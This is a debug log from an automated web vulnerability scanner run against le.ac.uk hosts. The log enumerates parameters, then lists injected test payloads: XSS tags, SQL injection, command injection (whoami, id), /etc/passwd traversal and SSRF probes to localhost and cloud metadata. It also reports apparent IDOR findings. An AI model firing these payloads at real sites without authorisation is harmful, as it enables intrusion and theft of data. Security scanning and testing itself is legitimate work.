+[04:09:22] [DEBUG] Discovered parameter: secret on https://le.ac.uk/website.xml
+[04:09:22] [DEBUG] Discovered parameter: return on http://webmail.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: csrf on https://shop.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: zip on https://le.ac.uk/library
+[04:09:22] [DEBUG] Discovered parameter: key on http://shop.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: lastname on https://www.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: apikey on https://le.ac.uk/website.xml
+[04:09:23] [DEBUG] Discovered parameter: callback on http://webmail.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: csrf_token on https://shop.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: city on https://www.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: action on http://webmail.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: secret on http://shop.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: api_key on https://le.ac.uk/website.xml
+[04:09:23] [DEBUG] Discovered parameter: xsrf on https://shop.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: method on http://webmail.le.ac.uk
+[04:09:23] [DEBUG] Discovered parameter: state on https://www.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: mobile on https://le.ac.uk/media
+[04:09:24] [DEBUG] Discovered parameter: type on http://webmail.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: access_token on https://le.ac.uk/website.xml
+[04:09:24] [DEBUG] Discovered parameter: xsrf_token on https://shop.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: zip on https://www.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: apikey on http://shop.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: mode on http://webmail.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: country on https://le.ac.uk/library
+[04:09:24] [DEBUG] Discovered parameter: refresh_token on https://le.ac.uk/website.xml
+[04:09:24] [DEBUG] Discovered parameter: country on https://www.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: jwt on https://shop.le.ac.uk
+[04:09:24] [DEBUG] Discovered parameter: status on http://webmail.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: api_key on https://le.ac.uk/modules
+[04:09:25] [DEBUG] Discovered parameter: api_key on http://shop.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: error on http://webmail.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: lastname on http://www.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: bearer on https://shop.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: msg on http://webmail.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: csrf on https://le.ac.uk/website.xml
+[04:09:25] [DEBUG] Discovered parameter: city on http://www.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: message on http://webmail.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: access_token on http://shop.le.ac.uk
+[04:09:25] [DEBUG] Discovered parameter: file on https://shop.le.ac.uk
+[04:09:26] [DEBUG] Discovered parameter: csrf_token on https://le.ac.uk/website.xml
+[04:09:26] [DEBUG] Discovered parameter: debug on http://webmail.le.ac.uk
+[04:09:26] [DEBUG] Discovered parameter: state on http://www.le.ac.uk
+[04:09:26] [DEBUG] Discovered parameter: filename on https://shop.le.ac.uk
+[04:09:26] [DEBUG] Discovered parameter: test on http://webmail.le.ac.uk
+[04:09:26] [DEBUG] Discovered parameter: xsrf on https://le.ac.uk/website.xml
+[04:09:26] [DEBUG] Discovered parameter: refresh_token on http://shop.le.ac.uk
+[04:09:26] [DEBUG] Discovered parameter: admin on http://webmail.le.ac.uk
+[04:09:26] [DEBUG] Found 52 parameters on http://webmail.le.ac.uk
+[04:09:27] [DEBUG] Discovered parameter: zip on http://www.le.ac.uk
+[04:09:27] [DEBUG] Discovered parameter: url on https://shop.le.ac.uk
+[04:09:27] [DEBUG] Discovered parameter: xsrf_token on https://le.ac.uk/website.xml
+[04:09:27] [DEBUG] Discovered parameter: access_token on https://le.ac.uk/modules
+[04:09:27] [DEBUG] Discovered parameter: csrf on http://shop.le.ac.uk
+[04:09:27] [DEBUG] Discovered parameter: country on http://www.le.ac.uk
+[04:09:27] [DEBUG] Discovered parameter: jwt on https://le.ac.uk/website.xml
+[04:09:27] [DEBUG] Discovered parameter: uri on https://shop.le.ac.uk
+[04:09:27] [DEBUG] Discovered parameter: token on https://www.le.ac.uk
+[04:09:28] [DEBUG] Discovered parameter: token on https://le.ac.uk/library
+[04:09:28] [DEBUG] Discovered parameter: csrf_token on http://shop.le.ac.uk
+[04:09:28] [DEBUG] Discovered parameter: auth on https://www.le.ac.uk
+[04:09:28] [DEBUG] Discovered parameter: redirect on https://shop.le.ac.uk
+[04:09:28] [DEBUG] Discovered parameter: bearer on https://le.ac.uk/website.xml
+[04:09:28] [DEBUG] Discovered parameter: firstname on https://le.ac.uk/media
+[04:09:28] [DEBUG] Discovered parameter: auth on https://le.ac.uk/library
+[04:09:28] [DEBUG] Discovered parameter: return on https://shop.le.ac.uk
+[04:09:28] [DEBUG] Discovered parameter: xsrf on http://shop.le.ac.uk
+[04:09:28] [DEBUG] Discovered parameter: file on https://le.ac.uk/website.xml
+[04:09:29] [DEBUG] Discovered parameter: token on http://www.le.ac.uk
+[04:09:29] [DEBUG] Discovered parameter: callback on https://shop.le.ac.uk
+[04:09:29] [DEBUG] Discovered parameter: lastname on https://le.ac.uk/media
+[04:09:29] [DEBUG] Discovered parameter: filename on https://le.ac.uk/website.xml
+[04:09:29] [DEBUG] Discovered parameter: xsrf_token on http://shop.le.ac.uk
+[04:09:29] [DEBUG] Discovered parameter: session on https://le.ac.uk/library
+[04:09:29] [DEBUG] Discovered parameter: action on https://shop.le.ac.uk
+[04:09:29] [DEBUG] Discovered parameter: path on https://le.ac.uk/website.xml
+[04:09:30] [DEBUG] Discovered parameter: key on https://le.ac.uk/library
+[04:09:30] [DEBUG] Discovered parameter: jwt on http://shop.le.ac.uk
+[04:09:30] [DEBUG] Discovered parameter: method on https://shop.le.ac.uk
+[04:09:30] [DEBUG] Discovered parameter: secret on https://le.ac.uk/library
+[04:09:30] [DEBUG] Discovered parameter: url on https://le.ac.uk/website.xml
+[04:09:30] [DEBUG] Discovered parameter: refresh_token on https://le.ac.uk/modules
+[04:09:30] [DEBUG] Discovered parameter: type on https://shop.le.ac.uk
+[04:09:30] [DEBUG] Discovered parameter: csrf on https://le.ac.uk/modules
+[04:09:31] [DEBUG] Discovered parameter: bearer on http://shop.le.ac.uk
+[04:09:31] [DEBUG] Discovered parameter: uri on https://le.ac.uk/website.xml
+[04:09:31] [DEBUG] Discovered parameter: city on https://le.ac.uk/media
+[04:09:31] [DEBUG] Discovered parameter: mode on https://shop.le.ac.uk
+[04:09:31] [DEBUG] Discovered parameter: state on https://le.ac.uk/media
+[04:09:31] [DEBUG] Discovered parameter: redirect on https://le.ac.uk/website.xml
+[04:09:31] [DEBUG] Discovered parameter: apikey on https://le.ac.uk/library
+[04:09:31] [DEBUG] Discovered parameter: file on http://shop.le.ac.uk
+[04:09:31] [DEBUG] Discovered parameter: status on https://shop.le.ac.uk
+[04:09:31] [DEBUG] Discovered parameter: api_key on https://le.ac.uk/library
+[04:09:32] [DEBUG] Discovered parameter: return on https://le.ac.uk/website.xml
+[04:09:32] [DEBUG] Discovered parameter: zip on https://le.ac.uk/media
+[04:09:32] [DEBUG] Discovered parameter: error on https://shop.le.ac.uk
+[04:09:32] [DEBUG] Discovered parameter: country on https://le.ac.uk/media
+[04:09:32] [DEBUG] Discovered parameter: filename on http://shop.le.ac.uk
+[04:09:32] [DEBUG] Discovered parameter: msg on https://shop.le.ac.uk
+[04:09:32] [DEBUG] Discovered parameter: csrf_token on https://le.ac.uk/modules
+[04:09:32] [DEBUG] Discovered parameter: callback on https://le.ac.uk/website.xml
+[04:09:33] [DEBUG] Discovered parameter: xsrf on https://le.ac.uk/modules
+[04:09:33] [DEBUG] Discovered parameter: message on https://shop.le.ac.uk
+[04:09:33] [DEBUG] Discovered parameter: xsrf_token on https://le.ac.uk/modules
+[04:09:33] [DEBUG] Discovered parameter: action on https://le.ac.uk/website.xml
+[04:09:33] [DEBUG] Discovered parameter: jwt on https://le.ac.uk/modules
+[04:09:33] [DEBUG] Discovered parameter: url on http://shop.le.ac.uk
+[04:09:33] [DEBUG] Discovered parameter: debug on https://shop.le.ac.uk
+[04:09:33] [DEBUG] Discovered parameter: method on https://le.ac.uk/website.xml
+[04:09:33] [DEBUG] Discovered parameter: bearer on https://le.ac.uk/modules
+[04:09:34] [DEBUG] Discovered parameter: session on https://www.le.ac.uk
+[04:09:34] [DEBUG] Discovered parameter: test on https://shop.le.ac.uk
+[04:09:34] [DEBUG] Discovered parameter: uri on http://shop.le.ac.uk
+[04:09:34] [DEBUG] Discovered parameter: type on https://le.ac.uk/website.xml
+[04:09:34] [DEBUG] Discovered parameter: key on https://www.le.ac.uk
+[04:09:34] [DEBUG] Discovered parameter: auth on http://www.le.ac.uk
+[04:09:34] [DEBUG] Discovered parameter: admin on https://shop.le.ac.uk
+[04:09:34] [DEBUG] Found 64 parameters on https://shop.le.ac.uk
+[04:09:35] [DEBUG] Discovered parameter: secret on https://www.le.ac.uk
+[04:09:35] [DEBUG] Discovered parameter: mode on https://le.ac.uk/website.xml
+[04:09:35] [DEBUG] Discovered parameter: redirect on http://shop.le.ac.uk
+[04:09:35] [DEBUG] Discovered parameter: token on https://le.ac.uk/media
+[04:09:35] [DEBUG] Discovered parameter: apikey on https://www.le.ac.uk
+[04:09:35] [DEBUG] Discovered parameter: status on https://le.ac.uk/website.xml
+[04:09:35] [DEBUG] Discovered parameter: access_token on https://le.ac.uk/library
+[04:09:35] [DEBUG] Discovered parameter: return on http://shop.le.ac.uk
+[04:09:36] [DEBUG] Discovered parameter: auth on https://le.ac.uk/media
+[04:09:36] [DEBUG] Discovered parameter: error on https://le.ac.uk/website.xml
+[04:09:36] [DEBUG] Discovered parameter: file on https://le.ac.uk/modules
+[04:09:36] [DEBUG] Found 1 parameters on https://le.ac.uk/tagmanagertest
+[04:09:36] [DEBUG] Discovered parameter: filename on https://le.ac.uk/modules
+[04:09:36] [DEBUG] Discovered parameter: callback on http://shop.le.ac.uk
+[04:09:36] [DEBUG] Discovered parameter: msg on https://le.ac.uk/website.xml
+[04:09:36] [DEBUG] Discovered parameter: session on https://le.ac.uk/media
+[04:09:37] [DEBUG] Discovered parameter: key on https://le.ac.uk/media
+[04:09:37] [DEBUG] Discovered parameter: path on https://le.ac.uk/modules
+[04:09:37] [DEBUG] Discovered parameter: action on http://shop.le.ac.uk
+[04:09:37] [DEBUG] Discovered parameter: message on https://le.ac.uk/website.xml
+[04:09:37] [DEBUG] Found 1 parameters on https://le.ac.uk/regression-testing-area
+[04:09:37] [DEBUG] Discovered parameter: secret on https://le.ac.uk/media
+[04:09:37] [DEBUG] Discovered parameter: uri on https://le.ac.uk/modules
+[04:09:37] [DEBUG] Discovered parameter: apikey on https://le.ac.uk/media
+[04:09:37] [DEBUG] Discovered parameter: redirect on https://le.ac.uk/modules
+[04:09:37] [DEBUG] Discovered parameter: debug on https://le.ac.uk/website.xml
+[04:09:37] [DEBUG] Discovered parameter: api_key on https://le.ac.uk/media
+[04:09:38] [DEBUG] Discovered parameter: method on http://shop.le.ac.uk
+[04:09:38] [DEBUG] Discovered parameter: access_token on https://le.ac.uk/media
+[04:09:38] [DEBUG] Discovered parameter: session on http://www.le.ac.uk
+[04:09:38] [DEBUG] Discovered parameter: test on https://le.ac.uk/website.xml
+[04:09:38] [DEBUG] Discovered parameter: return on https://le.ac.uk/modules
+[04:09:38] [DEBUG] Discovered parameter: callback on https://le.ac.uk/modules
+[04:09:38] [DEBUG] Discovered parameter: type on http://shop.le.ac.uk
+[04:09:38] [DEBUG] Discovered parameter: admin on https://le.ac.uk/website.xml
+[04:09:38] [DEBUG] Found 50 parameters on https://le.ac.uk/website.xml
+[04:09:39] [DEBUG] Discovered parameter: refresh_token on https://le.ac.uk/media
+[04:09:39] [DEBUG] Discovered parameter: csrf on https://le.ac.uk/media
+[04:09:39] [DEBUG] Discovered parameter: key on http://www.le.ac.uk
+[04:09:39] [DEBUG] Discovered parameter: csrf_token on https://le.ac.uk/media
+[04:09:39] [DEBUG] Discovered parameter: mode on http://shop.le.ac.uk
+[04:09:39] [DEBUG] Discovered parameter: xsrf on https://le.ac.uk/media
+[04:09:40] [DEBUG] Discovered parameter: action on https://le.ac.uk/modules
+[04:09:40] [DEBUG] Discovered parameter: xsrf_token on https://le.ac.uk/media
+[04:09:40] [DEBUG] Discovered parameter: method on https://le.ac.uk/modules
+[04:09:40] [DEBUG] Discovered parameter: status on http://shop.le.ac.uk
+[04:09:40] [DEBUG] Discovered parameter: api_key on https://www.le.ac.uk
+[04:09:40] [DEBUG] Discovered parameter: type on https://le.ac.uk/modules
+[04:09:40] [DEBUG] Discovered parameter: mode on https://le.ac.uk/modules
+[04:09:40] [DEBUG] Discovered parameter: jwt on https://le.ac.uk/media
+[04:09:41] [DEBUG] Discovered parameter: status on https://le.ac.uk/modules
+[04:09:41] [DEBUG] Discovered parameter: error on http://shop.le.ac.uk
+[04:09:41] [DEBUG] Discovered parameter: bearer on https://le.ac.uk/media
+[04:09:41] [DEBUG] Discovered parameter: error on https://le.ac.uk/modules
+[04:09:41] [DEBUG] Discovered parameter: file on https://le.ac.uk/media
+[04:09:41] [DEBUG] Discovered parameter: msg on https://le.ac.uk/modules
+[04:09:41] [DEBUG] Discovered parameter: filename on https://le.ac.uk/media
+[04:09:41] [DEBUG] Discovered parameter: msg on http://shop.le.ac.uk
+[04:09:41] [DEBUG] Discovered parameter: secret on http://www.le.ac.uk
+[04:09:42] [DEBUG] Discovered parameter: refresh_token on https://le.ac.uk/library
+[04:09:42] [DEBUG] Discovered parameter: csrf on https://le.ac.uk/library
+[04:09:42] [DEBUG] Discovered parameter: message on http://shop.le.ac.uk
+[04:09:42] [DEBUG] Discovered parameter: csrf_token on https://le.ac.uk/library
+[04:09:42] [DEBUG] Discovered parameter: apikey on http://www.le.ac.uk
+[04:09:43] [DEBUG] Discovered parameter: debug on http://shop.le.ac.uk
+[04:09:43] [DEBUG] Discovered parameter: api_key on http://www.le.ac.uk
+[04:09:44] [DEBUG] Discovered parameter: access_token on http://www.le.ac.uk
+[04:09:44] [DEBUG] Discovered parameter: test on http://shop.le.ac.uk
+[04:09:44] [DEBUG] Discovered parameter: refresh_token on http://www.le.ac.uk
+[04:09:44] [DEBUG] Discovered parameter: admin on http://shop.le.ac.uk
+[04:09:44] [DEBUG] Found 64 parameters on http://shop.le.ac.uk
+[04:09:44] [DEBUG] Discovered parameter: csrf on http://www.le.ac.uk
+[04:09:45] [DEBUG] Discovered parameter: xsrf on https://le.ac.uk/library
+[04:09:45] [DEBUG] Discovered parameter: xsrf_token on https://le.ac.uk/library
+[04:09:45] [DEBUG] Discovered parameter: message on https://le.ac.uk/modules
+[04:09:45] [DEBUG] Discovered parameter: jwt on https://le.ac.uk/library
+[04:09:45] [DEBUG] Discovered parameter: debug on https://le.ac.uk/modules
+[04:09:45] [DEBUG] Discovered parameter: bearer on https://le.ac.uk/library
+[04:09:46] [DEBUG] Discovered parameter: path on https://le.ac.uk/media
+[04:09:46] [DEBUG] Discovered parameter: uri on https://le.ac.uk/media
+[04:09:46] [DEBUG] Discovered parameter: csrf_token on http://www.le.ac.uk
+[04:09:46] [DEBUG] Discovered parameter: redirect on https://le.ac.uk/media
+[04:09:47] [DEBUG] Discovered parameter: return on https://le.ac.uk/media
+[04:09:47] [DEBUG] Discovered parameter: file on https://le.ac.uk/library
+[04:09:47] [DEBUG] Discovered parameter: filename on https://le.ac.uk/library
+[04:09:47] [DEBUG] Discovered parameter: callback on https://le.ac.uk/media
+[04:09:48] [DEBUG] Discovered parameter: xsrf on http://www.le.ac.uk
+[04:09:48] [DEBUG] Discovered parameter: path on https://le.ac.uk/library
+[04:09:48] [DEBUG] Discovered parameter: xsrf_token on http://www.le.ac.uk
+[04:09:49] [DEBUG] Discovered parameter: jwt on http://www.le.ac.uk
+[04:09:49] [DEBUG] Discovered parameter: bearer on http://www.le.ac.uk
+[04:09:49] [DEBUG] Discovered parameter: test on https://le.ac.uk/modules
+[04:09:49] [DEBUG] Discovered parameter: admin on https://le.ac.uk/modules
+[04:09:49] [DEBUG] Found 67 parameters on https://le.ac.uk/modules
+[04:09:50] [DEBUG] Discovered parameter: file on http://www.le.ac.uk
+[04:09:50] [DEBUG] Discovered parameter: filename on http://www.le.ac.uk
+[04:09:51] [DEBUG] Discovered parameter: path on http://www.le.ac.uk
+[04:09:51] [DEBUG] Discovered parameter: action on https://le.ac.uk/media
+[04:09:51] [DEBUG] Discovered parameter: method on https://le.ac.uk/media
+[04:09:52] [DEBUG] Discovered parameter: type on https://le.ac.uk/media
+[04:09:52] [DEBUG] Discovered parameter: mode on https://le.ac.uk/media
+[04:09:52] [DEBUG] Discovered parameter: uri on http://www.le.ac.uk
+[04:09:53] [DEBUG] Discovered parameter: redirect on http://www.le.ac.uk
+[04:09:53] [DEBUG] Discovered parameter: return on http://www.le.ac.uk
+[04:09:54] [DEBUG] Discovered parameter: callback on http://www.le.ac.uk
+[04:09:54] [DEBUG] Discovered parameter: action on http://www.le.ac.uk
+[04:09:55] [DEBUG] Discovered parameter: method on http://www.le.ac.uk
+[04:09:55] [DEBUG] Discovered parameter: type on http://www.le.ac.uk
+[04:09:55] [DEBUG] Discovered parameter: refresh_token on https://www.le.ac.uk
+[04:09:56] [DEBUG] Discovered parameter: mode on http://www.le.ac.uk
+[04:09:56] [DEBUG] Discovered parameter: csrf on https://www.le.ac.uk
+[04:09:56] [DEBUG] Discovered parameter: status on http://www.le.ac.uk
+[04:09:56] [DEBUG] Discovered parameter: csrf_token on https://www.le.ac.uk
+[04:09:57] [DEBUG] Discovered parameter: error on http://www.le.ac.uk
+[04:09:57] [DEBUG] Discovered parameter: msg on http://www.le.ac.uk
+[04:09:58] [DEBUG] Discovered parameter: status on https://le.ac.uk/media
+[04:09:58] [DEBUG] Discovered parameter: error on https://le.ac.uk/media
+[04:09:59] [DEBUG] Discovered parameter: message on http://www.le.ac.uk
+[04:09:59] [DEBUG] Discovered parameter: debug on http://www.le.ac.uk
+[04:10:00] [DEBUG] Discovered parameter: uri on https://le.ac.uk/library
+[04:10:00] [DEBUG] Discovered parameter: redirect on https://le.ac.uk/library
+[04:10:00] [DEBUG] Discovered parameter: test on http://www.le.ac.uk
+[04:10:01] [DEBUG] Discovered parameter: msg on https://le.ac.uk/media
+[04:10:01] [DEBUG] Discovered parameter: message on https://le.ac.uk/media
+[04:10:01] [DEBUG] Discovered parameter: admin on http://www.le.ac.uk
+[04:10:01] [DEBUG] Found 74 parameters on http://www.le.ac.uk
+[04:10:02] [DEBUG] Discovered parameter: return on https://le.ac.uk/library
+[04:10:02] [DEBUG] Discovered parameter: callback on https://le.ac.uk/library
+[04:10:02] [DEBUG] Discovered parameter: xsrf on https://www.le.ac.uk
+[04:10:03] [DEBUG] Discovered parameter: xsrf_token on https://www.le.ac.uk
+[04:10:03] [DEBUG] Discovered parameter: debug on https://le.ac.uk/media
+[04:10:03] [DEBUG] Discovered parameter: test on https://le.ac.uk/media
+[04:10:03] [DEBUG] Discovered parameter: admin on https://le.ac.uk/media
+[04:10:03] [DEBUG] Found 75 parameters on https://le.ac.uk/media
+[04:10:04] [DEBUG] Discovered parameter: jwt on https://www.le.ac.uk
+[04:10:04] [DEBUG] Discovered parameter: action on https://le.ac.uk/library
+[04:10:04] [DEBUG] Discovered parameter: method on https://le.ac.uk/library
+[04:10:05] [DEBUG] Discovered parameter: type on https://le.ac.uk/library
+[04:10:05] [DEBUG] Discovered parameter: mode on https://le.ac.uk/library
+[04:10:05] [DEBUG] Discovered parameter: bearer on https://www.le.ac.uk
+[04:10:05] [DEBUG] Discovered parameter: file on https://www.le.ac.uk
+[04:10:06] [DEBUG] Discovered parameter: status on https://le.ac.uk/library
+[04:10:06] [DEBUG] Discovered parameter: filename on https://www.le.ac.uk
+[04:10:06] [DEBUG] Discovered parameter: path on https://www.le.ac.uk
+[04:10:07] [DEBUG] Discovered parameter: uri on https://www.le.ac.uk
+[04:10:07] [DEBUG] Discovered parameter: error on https://le.ac.uk/library
+[04:10:07] [DEBUG] Discovered parameter: redirect on https://www.le.ac.uk
+[04:10:08] [DEBUG] Discovered parameter: return on https://www.le.ac.uk
+[04:10:08] [DEBUG] Discovered parameter: msg on https://le.ac.uk/library
+[04:10:08] [DEBUG] Discovered parameter: callback on https://www.le.ac.uk
+[04:10:08] [DEBUG] Discovered parameter: action on https://www.le.ac.uk
+[04:10:09] [DEBUG] Discovered parameter: method on https://www.le.ac.uk
+[04:10:09] [DEBUG] Discovered parameter: message on https://le.ac.uk/library
+[04:10:09] [DEBUG] Discovered parameter: type on https://www.le.ac.uk
+[04:10:10] [DEBUG] Discovered parameter: mode on https://www.le.ac.uk
+[04:10:10] [DEBUG] Discovered parameter: status on https://www.le.ac.uk
+[04:10:10] [DEBUG] Discovered parameter: debug on https://le.ac.uk/library
+[04:10:11] [DEBUG] Discovered parameter: error on https://www.le.ac.uk
+[04:10:11] [DEBUG] Discovered parameter: msg on https://www.le.ac.uk
+[04:10:11] [DEBUG] Discovered parameter: test on https://le.ac.uk/library
+[04:10:11] [DEBUG] Discovered parameter: message on https://www.le.ac.uk
+[04:10:12] [DEBUG] Discovered parameter: debug on https://www.le.ac.uk
+[04:10:12] [DEBUG] Discovered parameter: test on https://www.le.ac.uk
+[04:10:13] [DEBUG] Discovered parameter: admin on https://www.le.ac.uk
+[04:10:13] [DEBUG] Found 73 parameters on https://www.le.ac.uk
+[04:10:13] [DEBUG] Discovered parameter: admin on https://le.ac.uk/library
+[04:10:13] [DEBUG] Found 79 parameters on https://le.ac.uk/library
+[04:10:13] [SUCCESS] Parameter enumeration complete. Enumerated 14 pages
+[04:10:13] [PHASE: VulnerabilityScanning] Starting vulnerability scanning
+[04:10:29] [DEBUG] Test failed for contentUrl=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for cy=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for width=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for postalCode=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for username=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for cw=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for url=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for address=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for addressLocality=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:29] [DEBUG] Test failed for name=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:30] [DEBUG] Test failed for hash=`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:36] [DEBUG] Test failed for id=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:38] [DEBUG] Test failed for q=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:43] [DEBUG] Test failed for sameAs='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:45] [DEBUG] Test failed for address=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:45] [DEBUG] Test failed for cw=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:45] [DEBUG] Test failed for name=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:45] [DEBUG] Test failed for addressLocality=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:46] [DEBUG] Test failed for analytics_storage=http://127.0.0.1:22: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:53] [DEBUG] Test failed for datePublished='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:10:53] [DEBUG] Test failed for addressCountry=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:01] [DEBUG] Test failed for user=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:05] [DEBUG] Test failed for addressRegion=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:08] [DEBUG] Test failed for id=<img src=x onerror=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:09] [DEBUG] Test failed for name=' OR 1=1--: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:11] [DEBUG] Test failed for url=' OR 1=1--: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:19] [DEBUG] Test failed for sameAs=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:19] [DEBUG] Test failed for cx=2: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:22] [DEBUG] Test failed for dateModified=http://169.254.169.254/latest/meta-data/: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:22] [DEBUG] Test failed for contentUrl="><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:23] [DEBUG] Test failed for level=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:23] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
+[04:11:23] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
+[04:11:24] [DEBUG] Test failed for address=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:25] [DEBUG] Test failed for cw='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:26] [DEBUG] Test failed for addressRegion=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:28] [DEBUG] Test failed for hash=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:30] [DEBUG] Test failed for height=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:31] [DEBUG] Test failed for addressCountry=test: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:32] [DEBUG] Test failed for datePublished=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:33] [DEBUG] Test failed for name='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:34] [DEBUG] Test failed for sameAs=2: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:35] [DEBUG] Test failed for ad_user_data=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:38] [DEBUG] Test failed for ad_personalization=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:38] [DEBUG] Test failed for postalCode=100: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:39] [DEBUG] Test failed for level='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:40] [DEBUG] Test failed for width=http://127.0.0.1:22: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:41] [DEBUG] Test failed for addressRegion=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:42] [DEBUG] Test failed for address='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:44] [DEBUG] Test failed for description=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:45] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
+[04:11:45] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
+[04:11:47] [DEBUG] Test failed for analytics_storage=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:47] [DEBUG] Test failed for q=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:48] [DEBUG] Test failed for addressCountry=&& whoami: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:48] [DEBUG] Test failed for cx=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:49] [DEBUG] Test failed for id=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:53] [DEBUG] Test failed for postalCode=admin: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:55] [DEBUG] Test failed for width=http://[::1]:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:56] [DEBUG] Test failed for dateModified=test: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
